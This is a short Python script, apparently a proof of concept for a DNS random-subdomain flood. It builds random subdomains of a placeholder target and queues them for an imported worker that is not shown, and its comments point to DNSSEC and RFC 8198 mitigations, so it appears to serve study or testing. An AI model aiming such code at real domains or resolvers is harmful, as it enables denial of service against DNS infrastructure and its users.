import asyncio
import random
import string
from asyncio import Queue

from worker import Worker


def random_token(length=6) -> str:
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))


def generate_random_subdomain(domain: str):
    return '{}.{}'.format(random_token(), domain)


async def producer(target_domain: str, domain_queue: Queue):
    for _ in range(15):
        # todo: rdtype can be AAAA or ANY too. Response to ANY may be rejected with HINFO[rfc8482],
        #  so it's not used for now.
        random_subdomain = generate_random_subdomain(target_domain)
        domain_queue.put_nowait(random_subdomain)


async def attack(target_domain: str):
    domain_queue = Queue(maxsize=10000)

    w = Worker(domain_queue)

    await asyncio.wait({w.run(), producer(target_domain, domain_queue)})


async def main():
    await attack(target_domain='targetdomain.site')


# todo Mitigation: DNSSEC in auth servers: https://blog.apnic.net/2020/05/21/nxnsattack-upgrade-resolvers-to-stop-new
#  -kind-of-random-subdomain-attack/
# todo https://indico.dns-oarc.net/event/28/contributions/509/attachments/479/786/DNS-OARC-28-presentation-RFC8198.pdf

if __name__ == '__main__':
    asyncio.run(main())
